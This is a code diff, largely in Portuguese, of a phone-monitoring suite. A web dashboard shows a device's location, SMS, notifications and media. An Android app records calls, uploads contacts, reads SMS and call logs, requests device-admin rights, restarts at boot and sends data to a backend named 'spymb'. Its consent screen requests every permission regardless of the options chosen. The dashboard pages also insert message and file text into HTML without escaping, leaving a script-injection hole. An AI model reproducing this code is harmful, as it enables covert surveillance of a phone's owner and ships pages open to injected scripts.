+          const now = Date.now();
+          let cutoff = 0;
+          if (range === '1h') cutoff = now - 1000*60*60;
+          else if (range === '24h') cutoff = now - 1000*60*60*24;
+          else if (range === '7d') cutoff = now - 1000*60*60*24*7;
+          if (Number(p.ts) < cutoff) return; // ignore
+        }
+        latlngs.push([Number(p.lat), Number(p.lon)]);
+        addPoint(p.lat, p.lon, p.acc, p.ts, true);
+        prependList(p.lat, p.lon, p.acc, p.ts);
+      } catch(e) { console.error('handleRealtimeData err', e); }
+    }
+
+    // UI binding + auto refresh
+    document.getElementById('btnLoad').addEventListener('click', async () => {
+      await loadOnce();
+      const deviceId = document.getElementById('deviceId').value.trim();
+      const realtimeChecked = document.getElementById('realtimeToggle').checked;
+      if (realtimeChecked) startRealtime(deviceId); else stopRealtime();
+      if (autoRefreshHandle) { clearInterval(autoRefreshHandle); autoRefreshHandle = null; }
+      if (document.getElementById('autoRefresh').checked) {
+        autoRefreshHandle = setInterval(() => { loadOnce(); }, 30000);
+      }
+    });
+
+    document.getElementById('btnClear').addEventListener('click', clearAll);
+    document.getElementById('logout').addEventListener('click', ()=>{ localStorage.clear(); location.href='/' });
+
+    // realtime toggle listener
+    document.getElementById('realtimeToggle').addEventListener('change', (ev) => {
+      const deviceId = document.getElementById('deviceId').value.trim();
+      if (!deviceId) return alert('Insira deviceId');
+      if (ev.target.checked) startRealtime(deviceId); else stopRealtime();
+    });
+
+    // autoload from querystring
+    const q = new URLSearchParams(window.location.search);
+    if (q.get('deviceId')) { document.getElementById('deviceId').value = q.get('deviceId'); setTimeout(()=>{ document.getElementById('btnLoad').click(); }, 300); }
+  </script>
+</body>
+</html>
+
+web-frontend/user/media.html
+<!doctype html>
+<html>
+<head><meta charset="utf-8"/><title>Media</title><link rel="stylesheet" href="/css/styles.css"></head>
+<body>
+  <div class="container">
+    <header style="display:flex;justify-content:space-between"><h1>Media</h1><div><a href="/user/dashboard.html">Voltar</a> <button id="logout">Logout</button></div></header>
+
+    <div class="card">
+      <label>DeviceId: <input id="deviceId" /></label>
+      <button id="btnLoad">Listar</button>
+    </div>
+
+    <div class="card"><ul id="list" style="list-style:none;padding-left:0"></ul></div>
+  </div>
+
+  <script src="/js/api.js"></script>
+  <script>
+    if (!localStorage.getItem('auth_token')) location.href = '/';
+    const token = localStorage.getItem('auth_token');
+    document.getElementById('logout').addEventListener('click', ()=>{ localStorage.clear(); location.href='/' });
+
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('deviceId')) document.getElementById('deviceId').value = params.get('deviceId');
+
+    document.getElementById('btnLoad').addEventListener('click', async () => {
+      const deviceId = document.getElementById('deviceId').value.trim();
+      if (!deviceId) return alert('DeviceId required');
+      const r = await apiFetch('/api/media/list/' + encodeURIComponent(deviceId), { method:'GET' });
+      const ul = document.getElementById('list'); ul.innerHTML = '';
+      if (!r.ok) { ul.innerHTML = '<li>Erro: ' + JSON.stringify(r) + '</li>'; return; }
+      r.files.forEach(f => {
+        const li = document.createElement('li');
+        li.innerHTML = `<div style="padding:8px;border-bottom:1px solid #eee"><strong>${f.filename}</strong><div>${new Date(f.uploadDate).toLocaleString()}</div>
+                        <button class="btnOpen" data-id="${f.fileId}">Abrir</button></div>`;
+        ul.appendChild(li);
+      });
+
+      // attach open handlers
+      document.querySelectorAll('.btnOpen').forEach(b => {
+        b.addEventListener('click', async () => {
+          const fileId = b.getAttribute('data-id');
+          try {
+            const res = await fetch('/api/media/download/' + encodeURIComponent(fileId), {
+              headers: { 'Authorization': 'Bearer ' + token }
+            });
+            if (!res.ok) { alert('Erro: ' + await res.text()); return; }
+            const blob = await res.blob();
+            const url = URL.createObjectURL(blob);
+            window.open(url, '_blank');
+            setTimeout(()=> URL.revokeObjectURL(url), 30*60*1000);
+          } catch (err) {
+            alert('Erro: ' + err.message);
+          }
+        });
+      });
+
+    });
+
+    if (document.getElementById('deviceId').value) document.getElementById('btnLoad').click();
+  </script>
+</body>
+</html>
+
+web-frontend/user/ messages.html
+<!doctype html>
+<html>
+<head><meta charset="utf-8"/><title>Mensagens</title><link rel="stylesheet" href="/css/styles.css"></head>
+<body>
+  <div class="container">
+    <header style="display:flex;justify-content:space-between"><h1>Mensagens (SMS)</h1><div><a href="/user/dashboard.html">Voltar</a> <button id="logout">Logout</button></div></header>
+    <div class="card"><label>DeviceId: <input id="deviceId" /></label><button id="btnLoad">Carregar</button></div>
+    <div class="card"><ul id="list" style="list-style:none;padding-left:0"></ul></div>
+  </div>
+  <script src="/js/api.js"></script>
+  <script>
+    if (!localStorage.getItem('auth_token')) location.href = '/';
+    document.getElementById('logout').addEventListener('click', ()=>{ localStorage.clear(); location.href='/' });
+
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('deviceId')) document.getElementById('deviceId').value = params.get('deviceId');
+
+    document.getElementById('btnLoad').addEventListener('click', async () => {
+      const deviceId = document.getElementById('deviceId').value.trim();
+      if (!deviceId) return alert('DeviceId required');
+      const r = await apiFetch('/api/telemetry/' + encodeURIComponent(deviceId) + '/items?type=sms', { method:'GET' });
+      const ul = document.getElementById('list'); ul.innerHTML = '';
+      if (!r.ok) { ul.innerHTML = '<li>Erro: ' + JSON.stringify(r) + '</li>'; return; }
+      r.items.forEach(it => {
+        const ts = new Date(it.ts).toLocaleString();
+        const p = it.payload || it;
+        const from = p.payload && p.payload.from ? p.payload.from : (p.from||'');
+        const body = p.payload && p.payload.body ? p.payload.body : (p.body||'');
+        const li = document.createElement('li');
+        li.innerHTML = `<div style="padding:8px;border-bottom:1px solid #eee"><small>${ts}</small><div><strong>From:</strong> ${from}</div><div>${body}</div></div>`;
+        ul.appendChild(li);
+      });
+    });
+
+    if (document.getElementById('deviceId').value) document.getElementById('btnLoad').click();
+  </script>
+</body>
+</html>
+
+web-frontend/user/ notifications.html
+
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/><title>Notificações</title>
+  <link rel="stylesheet" href="/css/styles.css">
+</head>
+<body>
+  <div class="container">
+    <header style="display:flex;justify-content:space-between">
+      <h1>Notificações</h1>
+      <div><a href="/user/dashboard.html">Voltar</a> <button id="logout">Logout</button></div>
+    </header>
+
+    <div class="card">
+      <label>DeviceId: <input id="deviceId" /></label>
+      <button id="btnLoad">Carregar</button>
+    </div>
+
+    <div class="card">
+      <h3>Lista</h3>
+      <ul id="list" style="list-style:none;padding-left:0"></ul>
+    </div>
+  </div>
+
+  <script src="/js/api.js"></script>
+  <script>
+    const token = localStorage.getItem('auth_token');
+    if (!token) location.href = '/';
+
+    document.getElementById('logout').addEventListener('click', ()=>{ localStorage.clear(); location.href='/' });
+
+    // se vier ?deviceId=... preenche
+    const params = new URLSearchParams(window.location.search);
+    const initialDevice = params.get('deviceId');
+    if (initialDevice) document.getElementById('deviceId').value = initialDevice;
+
+    document.getElementById('btnLoad').addEventListener('click', load);
+
+    async function load(){
+      const deviceId = document.getElementById('deviceId').value.trim();
+      if (!deviceId) return alert('deviceId required');
+      const r = await apiFetch('/api/telemetry/' + encodeURIComponent(deviceId) + '/items?type=notification', { method:'GET' });
+      const ul = document.getElementById('list');
+      ul.innerHTML = '';
+      if (!r.ok) { ul.innerHTML = '<li>Erro: ' + JSON.stringify(r) + '</li>'; return; }
+      r.items.forEach(item => {
+        const li = document.createElement('li');
+        const ts = new Date(item.ts).toLocaleString();
+        const payload = item.payload || item;
+        li.innerHTML = `<div style="padding:8px;border-bottom:1px solid #eee"><small>${ts}</small><div><strong>${payload.payload && payload.payload.title ? payload.payload.title : (payload.title||'')}</strong></div><div>${payload.payload && payload.payload.text ? payload.payload.text : (payload.text||'')}</div></div>`;
+        ul.appendChild(li);
+      });
+    }
+
+    // auto load if deviceId provided
+    if (initialDevice) load();
+  </script>
+</body>
+</html>
+Aplicação android:
+device-manager-suite/app/libs/ gson-2.8.9
+device-manager-suite/app/libs/ okhttp-3.14.9
+device-manager-suite/app/libs/ okio-1.17.5
+
+device-manager-suite/app/src/main/java/com/company/devicemgr/activities/ConsentActivity.java
+package com.company.devicemgr.activities;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.CheckBox;
+import android.widget.TextView;
+import android.widget.Toast;
+import androidx.core.app.ActivityCompat;
+
+import com.company.devicemgr.services.CallRecorderService;
+import com.company.devicemgr.services.ContactsUploaderService;
+
+public class ConsentActivity extends Activity {
+	private static final int REQ_PERMS = 1234;
+	CheckBox chkContacts, chkCalls;
+	Button btnGrant;
+	TextView tvStatus;
+	
+	String[] perms = new String[]{
+		android.Manifest.permission.READ_CONTACTS,
+		android.Manifest.permission.RECORD_AUDIO,
+		android.Manifest.permission.READ_PHONE_STATE,
+		android.Manifest.permission.READ_CALL_LOG,
+		android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
+		android.Manifest.permission.READ_EXTERNAL_STORAGE
+	};
+	
+	@Override
+	protected void onCreate(Bundle s) {
+		super.onCreate(s);
+		setContentView(com.company.devicemgr.R.layout.activity_consent);
+		
+		chkContacts = findViewById(com.company.devicemgr.R.id.chkContacts);
+		chkCalls = findViewById(com.company.devicemgr.R.id.chkCalls);
+		btnGrant = findViewById(com.company.devicemgr.R.id.btnGrant);
+		tvStatus = findViewById(com.company.devicemgr.R.id.tvStatus);
+		
+		btnGrant.setOnClickListener(new View.OnClickListener() {
+			@Override public void onClick(View v) {
+				boolean wantContacts = chkContacts.isChecked();
+				boolean wantCalls = chkCalls.isChecked();
+				if (!wantContacts && !wantCalls) {
+					Toast.makeText(ConsentActivity.this, "Seleciona ao menos uma opção", Toast.LENGTH_SHORT).show();
+					return;
+				}
+				ActivityCompat.requestPermissions(ConsentActivity.this, perms, REQ_PERMS);
+			}
+		});
+	}
+	
+	@Override
+	public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+		if (requestCode == REQ_PERMS) {
+			boolean allGranted = true;
+			for (int r : grantResults) if (r != PackageManager.PERMISSION_GRANTED) allGranted = false;
+			if (!allGranted) {
+				tvStatus.setText("Permissões não concedidas. Dá permissões nas definições.");
+				Toast.makeText(this, "Permissões não concedidas.", Toast.LENGTH_LONG).show();
+				return;
+			}
+			boolean wantContacts = ((CheckBox)findViewById(com.company.devicemgr.R.id.chkContacts)).isChecked();
+			boolean wantCalls = ((CheckBox)findViewById(com.company.devicemgr.R.id.chkCalls)).isChecked();
+			getSharedPreferences("devicemgr_prefs", MODE_PRIVATE)
+			.edit()
+			.putBoolean("consent_contacts", wantContacts)
+			.putBoolean("consent_calls", wantCalls)
+			.apply();
+			
+			tvStatus.setText("Consentimento guardado.");
+			
+			if (wantContacts) {
+				try { startService(new Intent(this, ContactsUploaderService.class)); } catch (Exception e) {}
+			}
+			if (wantCalls) {
+				try { startService(new Intent(this, CallRecorderService.class)); } catch (Exception e) {}
+			}
+			
+			Toast.makeText(this, "Consentimento registado e serviços iniciados", Toast.LENGTH_SHORT).show();
+			finish();
+			} else {
+			super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+		}
+	}
+}
+
+
+
+
+suite/app/src/main/java/com/company/devicemgr/activities/LoginActivity.java
+
+package com.company.devicemgr.activities;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.Toast;
+
+import com.company.devicemgr.utils.HttpClient;
+
+import org.json.JSONObject;
+
+import java.util.UUID;
+
+public class LoginActivity extends Activity {
+	EditText etEmail, etPassword;
+	Button btnLogin;
+	
+	@Override protected void onCreate(Bundle s) {
+		super.onCreate(s);
+		setContentView(com.company.devicemgr.R.layout.activity_login);
+		
+		etEmail = findViewById(com.company.devicemgr.R.id.etEmail);
+		etPassword = findViewById(com.company.devicemgr.R.id.etPassword);
+		btnLogin = findViewById(com.company.devicemgr.R.id.btnLogin);
+		
+		btnLogin.setOnClickListener(new View.OnClickListener(){
+			@Override public void onClick(View v){
+				final String email = etEmail.getText().toString().trim();
+				final String password = etPassword.getText().toString().trim();
+				if(email.length() == 0 || password.length() == 0) {
+					Toast.makeText(LoginActivity.this, "Preenche email e password", Toast.LENGTH_SHORT).show();
+					return;
+				}
+				btnLogin.setEnabled(false);
+				new Thread(new Runnable(){ public void run(){
+						try {
+							JSONObject body = new JSONObject();
+							body.put("email", email);
+							body.put("password", password);
+							
+							// Backend login endpoint
+							String url = "https://spymb.onrender.com/api/auth/login";
+							String res = HttpClient.postJson(url, body.toString(), null);
+							
+							final JSONObject jo = new JSONObject(res);
+							if (jo.has("token")) {
+								final String token = jo.getString("token");
+								final String userId = jo.optString("userId", null);
+								final String role = jo.optString("role", "user");
+								// deviceId: if not present, generate one and save locally
+								SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+								String deviceId = sp.getString("deviceId", null);
+								if (deviceId == null || deviceId.length() == 0) {
+									deviceId = UUID.randomUUID().toString();
+									sp.edit().putString("deviceId", deviceId).apply();
+								}
+								sp.edit().putString("auth_token", token).putString("userId", userId).putString("role", role).apply();
+								
+								// start foreground service
+								runOnUiThread(new Runnable(){ public void run(){
+										Toast.makeText(LoginActivity.this, "Login OK", Toast.LENGTH_SHORT).show();
+										try {
+											Intent svc = new Intent(LoginActivity.this, com.company.devicemgr.services.ForegroundTelemetryService.class);
+											if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+												startForegroundService(svc);
+												} else {
+												startService(svc);
+											}
+										} catch (Exception e) { e.printStackTrace(); }
+										
+										// open permissions/main screen
+										startActivity(new Intent(LoginActivity.this, MainPermissionsActivity.class));
+										finish();
+								}});
+								} else {
+								final String err = jo.optString("error", res);
+								runOnUiThread(new Runnable(){ public void run(){
+										Toast.makeText(LoginActivity.this, "Login falhou: " + err, Toast.LENGTH_LONG).show();
+										btnLogin.setEnabled(true);
+								}});
+							}
+							} catch (final Exception e) {
+							e.printStackTrace();
+							runOnUiThread(new Runnable(){ public void run(){
+									Toast.makeText(LoginActivity.this, "Erro: " + e.getMessage(), Toast.LENGTH_LONG).show();
+									btnLogin.setEnabled(true);
+							}});
+						}
+				}}).start();
+			}
+		});
+	}
+}
+
+
+suite/app/src/main/java/com/company/devicemgr/activities/MainPermissionsActivity.java
+package com.company.devicemgr.activities;
+
+import android.app.Activity;
+import android.app.AlertDialog;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.provider.MediaStore;
+import android.provider.Settings;
+import android.util.Log;
+import android.view.View;
+import android.widget.Button;
+import android.widget.TextView;
+
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+import com.company.devicemgr.receivers.DeviceAdminReceiver;
+import com.company.devicemgr.services.CallRecorderService;
+import com.company.devicemgr.services.ContactsUploaderService;
+import com.company.devicemgr.services.ForegroundTelemetryService;
+import com.company.devicemgr.utils.HttpClient;
+
+import org.json.JSONObject;
+
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.net.URLEncoder;
+import java.util.ArrayList;
+import java.util.List;
+
+public class MainPermissionsActivity extends Activity {
+	private static final String TAG = "MainPermAct";
+	
+	private static final int REQ_CODE_DEVICE_ADMIN = 1001;
+	private static final int REQ_CODE_PERMS = 2001;
+	private static final int REQ_PICK_MEDIA = 3001;
+	
+	Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm,
+	btnNotifAccess, btnUsageAccess, btnStartService, btnPickMedia, btnConsent;
+	TextView tvStatus, tvDeviceId;
+	
+	@Override
+	protected void onCreate(Bundle savedInstanceState) {
+		super.onCreate(savedInstanceState);
+		setContentView(com.company.devicemgr.R.layout.activity_main_permissions);
+		
+		// find views
+		btnDeviceAdmin = findViewById(com.company.devicemgr.R.id.btnDeviceAdmin);
+		btnLocationPerm = findViewById(com.company.devicemgr.R.id.btnLocationPerm);
+		btnStoragePerm = findViewById(com.company.devicemgr.R.id.btnStoragePerm);
+		btnCallLogPerm = findViewById(com.company.devicemgr.R.id.btnCallLogPerm);
+		btnSmsPerm = findViewById(com.company.devicemgr.R.id.btnSmsPerm);
+		btnNotifAccess = findViewById(com.company.devicemgr.R.id.btnNotifAccess);
+		btnUsageAccess = findViewById(com.company.devicemgr.R.id.btnUsageAccess);
+		btnStartService = findViewById(com.company.devicemgr.R.id.btnStartService);
+		btnPickMedia = findViewById(com.company.devicemgr.R.id.btnPickMedia);
+		btnConsent = findViewById(com.company.devicemgr.R.id.btnConsent);
+		
+		tvStatus = findViewById(com.company.devicemgr.R.id.tvStatus);
+		tvDeviceId = findViewById(com.company.devicemgr.R.id.tvDeviceId);
+		
+		// ensure deviceId exists
+		final SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+		String deviceId = sp.getString("deviceId", null);
+		if (deviceId == null) {
+			deviceId = java.util.UUID.randomUUID().toString();
+			sp.edit().putString("deviceId", deviceId).apply();
+		}
+		tvDeviceId.setText("DeviceId: " + deviceId);
+		
+		// listeners
+		if (btnDeviceAdmin != null) {
+			btnDeviceAdmin.setOnClickListener(v -> {
+				try {
+					DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+					ComponentName adminComp = new ComponentName(MainPermissionsActivity.this, DeviceAdminReceiver.class);
+					if (!dpm.isAdminActive(adminComp)) {
+						Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+						intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
+						intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Necessário para bloqueio temporário e políticas.");
+						startActivityForResult(intent, REQ_CODE_DEVICE_ADMIN);
+						} else {
+						showMsg("Device Admin já activo");
+					}
+					} catch (Exception e) {
+					Log.e(TAG, "btnDeviceAdmin click err", e);
+					showMsg("Erro: " + e.getMessage());
+				}
+			});
+		}
+		
+		if (btnLocationPerm != null) {
+			btnLocationPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
+				android.Manifest.permission.ACCESS_FINE_LOCATION,
+				android.Manifest.permission.ACCESS_COARSE_LOCATION
+			}));
+		}
+		
+		if (btnStoragePerm != null) {
+			btnStoragePerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
+				android.Manifest.permission.READ_EXTERNAL_STORAGE,
+				android.Manifest.permission.WRITE_EXTERNAL_STORAGE
+			}));
+		}
+		
+		if (btnCallLogPerm != null) {
+			btnCallLogPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
+				android.Manifest.permission.READ_CALL_LOG
+			}));
+		}
+		
+		if (btnSmsPerm != null) {
+			btnSmsPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
+				android.Manifest.permission.READ_SMS
+			}));
+		}
+		
+		if (btnNotifAccess != null) {
+			btnNotifAccess.setOnClickListener(v -> {
+				try {
+					Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+					startActivity(i);
+					} catch (Exception e) {
+					Log.e(TAG, "open notif settings err", e);
+					showMsg("Não foi possível abrir definições de notificações");
+				}
+			});
+		}
+		
+		if (btnUsageAccess != null) {
+			btnUsageAccess.setOnClickListener(v -> {
+				try {
+					Intent i = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
+					startActivity(i);
+					} catch (Exception e) {
+					Log.e(TAG, "open usage settings err", e);
+					showMsg("Não foi possível abrir definições de uso");
+				}
+			});
+		}
+		
+		if (btnConsent != null) {
+			btnConsent.setOnClickListener(v -> {
+				Log.i(TAG, "btnConsent clicked");
+				android.widget.Toast.makeText(MainPermissionsActivity.this, "Abrindo tela de consentimento...", android.widget.Toast.LENGTH_SHORT).show();
+				try {
+					Intent i = new Intent(MainPermissionsActivity.this, com.company.devicemgr.activities.ConsentActivity.class);
+					startActivity(i);
+					} catch (Exception ex) {
+					Log.e(TAG, "Erro ao iniciar ConsentActivity", ex);
+					showMsg("Erro ao abrir consentimento: " + ex.getMessage());
+				}
+			});
+		}
+		
+		if (btnStartService != null) {
+			btnStartService.setOnClickListener(v -> {
+				boolean active = sp.getBoolean("active", false);
+				if (!active) {
+					new AlertDialog.Builder(MainPermissionsActivity.this)
+					.setTitle("Aviso")
+					.setMessage("A conta pode não estar activada. Continua?")
+					.setPositiveButton("Sim", (d, which) -> startAllServices())
+					.setNegativeButton("Não", null)
+					.show();
+					} else {
+					startAllServices();
+				}
+			});
+		}
+		
+		if (btnPickMedia != null) {
+			btnPickMedia.setOnClickListener(v -> {
+				try {
+					Intent i = new Intent(Intent.ACTION_OPEN_DOCUMENT);
+					i.addCategory(Intent.CATEGORY_OPENABLE);
+					i.setType("*/*");
+					String[] mime = {"image/*", "video/*"};
+					i.putExtra(Intent.EXTRA_MIME_TYPES, mime);
+					startActivityForResult(i, REQ_PICK_MEDIA);
+					} catch (Exception e) {
+					Log.e(TAG, "pick media err", e);
+					showMsg("Erro ao abrir chooser");
+				}
+			});
+		}
+		
+		// update status
+		updateStatusText();
+	}
+	
+	private void startAllServices() {
+		// start telemetry service (foreground)
+		try {
+			Intent svc = new Intent(this, ForegroundTelemetryService.class);
+			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ContextCompat.startForegroundService(this, svc);
+			else startService(svc);
+			} catch (Exception e) {
+			Log.e(TAG, "start telemetry err", e);
+			showMsg("Erro a iniciar telemetria: " + e.getMessage());
+		}
+		
+		// if consent flags present, start contacts/call recorder
+		SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+		boolean consentContacts = sp.getBoolean("consent_contacts", false);
+		boolean consentCalls = sp.getBoolean("consent_calls", false);
+		
+		if (consentContacts) {
+			try {
+				Intent c = new Intent(this, ContactsUploaderService.class);
+				if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ContextCompat.startForegroundService(this, c);
+				else startService(c);
+				} catch (Exception e) {
+				Log.e(TAG, "start contacts uploader err", e);
+			}
+		}
+		
+		if (consentCalls) {
+			try {
+				Intent cr = new Intent(this, CallRecorderService.class);
+				if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ContextCompat.startForegroundService(this, cr);
+				else startService(cr);
+				} catch (Exception e) {
+				Log.e(TAG, "start call recorder err", e);
+			}
+		}
+		
+		showMsg("Serviços iniciados (ver status)");
+		updateStatusText();
+	}
+	
+	private void showMsg(String m) {
+		if (tvStatus != null) tvStatus.setText("Status: " + m);
+	}
+	
+	private void updateStatusText() {
+		SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+		String token = sp.getString("auth_token", null);
+		String deviceId = sp.getString("deviceId", null);
+		boolean consentContacts = sp.getBoolean("consent_contacts", false);
+		boolean consentCalls = sp.getBoolean("consent_calls", false);
+		
+		String st = "Token: " + (token != null ? "OK" : "missing") +
+		"\nDeviceId: " + (deviceId != null ? deviceId : "-") +
+		"\nConsentContacts: " + (consentContacts ? "Yes" : "No") +
+		"\nConsentCalls: " + (consentCalls ? "Yes" : "No");
+		if (tvStatus != null) tvStatus.setText(st);
+		if (tvDeviceId != null) tvDeviceId.setText("DeviceId: " + (deviceId != null ? deviceId : "-"));
+	}
+	
+	private void requestPermissionsIfNeeded(String[] perms) {
+		List<String> need = new ArrayList<>();
+		for (String p : perms) {
+			if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+				need.add(p);
+			}
+		}
+		if (!need.isEmpty()) {
+			ActivityCompat.requestPermissions(this, need.toArray(new String[0]), REQ_CODE_PERMS);
+			} else {
+			showMsg("Permissões já concedidas");
+			// after granting, try start services that need them
+			startAllServices();
+		}
+	}
+	
+	@Override
+	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+		try {
+			super.onActivityResult(requestCode, resultCode, data);
+			if (requestCode == REQ_PICK_MEDIA && resultCode == RESULT_OK && data != null) {
+				Uri uri = data.getData();
+				if (uri != null) handlePickedMedia(uri);
+				} else if (requestCode == REQ_CODE_DEVICE_ADMIN) {
+				showMsg("Device admin resultado: " + resultCode);
+			}
+			} catch (Exception e) {
+			Log.e(TAG, "onActivityResult err", e);
+		}
+	}
+	
+	private void handlePickedMedia(final Uri uri) {
+		new Thread(() -> {
+			try {
+				InputStream is = getContentResolver().openInputStream(uri);
+				byte[] buf = readAllBytes(is);
+				String filename = queryName(uri);
+				String mime = getContentResolver().getType(uri);
+				SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+				String token = sp.getString("auth_token", null);
+				String deviceId = sp.getString("deviceId", "unknown");
+				String url = "https://spymb.onrender.com/api/media/" + URLEncoder.encode(deviceId, "UTF-8") + "/upload";
+				String resp = HttpClient.uploadFile(url, "media", filename, buf, mime, token);
+				runOnUiThread(() -> showMsg("Upload: " + resp));
+				} catch (Exception e) {
+				Log.e(TAG, "handlePickedMedia err", e);
+				runOnUiThread(() -> showMsg("Erro upload: " + e.getMessage()));
+			}
+		}).start();
+	}
+	
+	private static byte[] readAllBytes(InputStream is) throws java.io.IOException {
+		ByteArrayOutputStream bos = new ByteArrayOutputStream();
+		byte[] buffer = new byte[8192];
+		int read;
+		while ((read = is.read(buffer)) != -1) {
+			bos.write(buffer, 0, read);
+		}
+		try { is.close(); } catch (Exception ignored) {}
+		return bos.toByteArray();
+	}
+	
+	private String queryName(Uri uri) {
+		String displayName = "file";
+		android.database.Cursor cursor = null;
+		try {
+			cursor = getContentResolver().query(uri, null, null, null, null);
+			if (cursor != null && cursor.moveToFirst()) {
+				int idx = cursor.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME);
+				if (idx != -1) displayName = cursor.getString(idx);
+			}
+			} catch (Exception e) {
+			Log.e(TAG, "queryName err", e);
+			} finally {
+			if (cursor != null) cursor.close();
+		}
+		return displayName;
+	}
+	
+	@Override
+	public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+		if (requestCode == REQ_CODE_PERMS) {
+			boolean granted = true;
+			for (int r : grantResults) if (r != PackageManager.PERMISSION_GRANTED) granted = false;
+			showMsg(granted ? "Permissões concedidas" : "Algumas permisses negadas");
+			if (granted) startAllServices();
+		}
+		super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+	}
+}
+
+
+suite/app/src/main/java/com/company/devicemgr/receivers/ BootReceiver.java
+package com.company.devicemgr.receivers;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import com.company.devicemgr.services.ForegroundTelemetryService;
+
+public class BootReceiver extends BroadcastReceiver {
+	@Override public void onReceive(Context context, Intent intent) {
+		if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+			// optionally restart service if user wants
+			// start service only if stored flag says to start
+			android.content.SharedPreferences sp = context.getSharedPreferences("devicemgr_prefs", Context.MODE_PRIVATE);
+			boolean started = sp.getBoolean("service_started", false);
+			if (started) {
+				Intent svc = new Intent(context, ForegroundTelemetryService.class);
+				context.startForegroundService(svc);
+			}
+		}
+	}
+}
+
+
+
+
+suite/app/src/main/java/com/company/devicemgr/receivers/ DeviceAdminReceiver.java
+package com.company.devicemgr.receivers;
+  public class DeviceAdminReceiver extends android.app.admin.DeviceAdminReceiver {
+	@Override
+	public void onEnabled(android.content.Context context, android.content.Intent intent) {
+		android.widget.Toast.makeText(context, "Device admin enabled", android.widget.Toast.LENGTH_SHORT).show();
+	}
+	
+	@Override
+	public void onDisabled(android.content.Context context, android.content.Intent intent) {
+		android.widget.Toast.makeText(context, "Device admin disabled", android.widget.Toast.LENGTH_SHORT).show();
+	}
+}
+
+
+
+suite/app/src/main/java/com/company/devicemgr/ services/ CallRecorderService.java
+package com.company.devicemgr.services;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.media.MediaRecorder;
+import android.os.Build;
+import android.os.Environment;
+import android.os.IBinder;
+import android.telephony.PhoneStateListener;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+import androidx.core.app.NotificationCompat;
+
+import java.io.File;
+import java.io.IOException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+
+import com.company.devicemgr.utils.HttpClient;
+
+public class CallRecorderService extends Service {
+	private static final String TAG = "CallRecorderSvc";
+	private static final String CHANNEL_ID = "call_recorder_channel";
+	private static final int NOTIF_ID = 2002;
+	
+	private TelephonyManager telephonyManager;
+	private PhoneStateListener phoneListener;
+	private MediaRecorder recorder;
+	private File currentFile;
+	
+	@Override
+	public void onCreate() {
+		super.onCreate();
+		createNotificationChannel();
+	}
+	
+	private void createNotificationChannel() {
+		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+			NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Call Recorder", NotificationManager.IMPORTANCE_LOW);
+			NotificationManager nm = (NotificationManager) getSystemService(NotificationManager.class);
+			if (nm != null) nm.createNotificationChannel(ch);
+		}
+	}
+	
+	@Override
+	public int onStartCommand(Intent intent, int flags, int startId) {
+		// must call startForeground quickly
+		Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
+		.setContentTitle("DeviceMgr - Call recorder")
+		.setContentText("A gravar chamadas (se autorizadas)")
+		.setSmallIcon(android.R.drawable.ic_lock_silent_mode)
+		.setPriority(NotificationCompat.PRIORITY_LOW)
+		.build();
+		startForeground(NOTIF_ID, n);
+		
+		// Check permissions
+		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
